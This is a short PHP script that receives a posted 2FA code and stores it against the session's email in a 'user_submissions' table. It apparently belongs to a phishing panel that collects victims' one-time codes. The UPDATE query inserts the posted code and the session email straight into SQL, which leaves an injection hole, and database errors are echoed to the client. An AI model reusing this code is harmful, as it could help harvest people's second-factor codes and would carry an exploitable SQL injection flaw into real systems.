<?php
// store_2fa_code.php

// Include the database connection file
require_once "admin/db_connection.php";

// Check if the code is received via POST
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["code"])) {
    // Retrieve the code from the POST data
    $code = $_POST["code"];

    // Retrieve the email from the session
    session_start();
    if (isset($_SESSION["email"])) {
        $email = $_SESSION["email"];

        // Update the user's phone_otp column with the 2FA code
        $update_sql = "UPDATE user_submissions SET phone_otp='$code' WHERE email='$email'";
        if ($conn->query($update_sql) === TRUE) {
            // Code stored successfully
            echo "Code stored successfully";
            exit();
        } else {
            // Error updating phone_otp in the database
            echo "Error updating phone_otp: " . $conn->error;
        }
    } else {
        // Email not set in session
        echo "Email not found in session";
    }
} else {
    // Code not received via POST
    echo "Code not received";
}
?>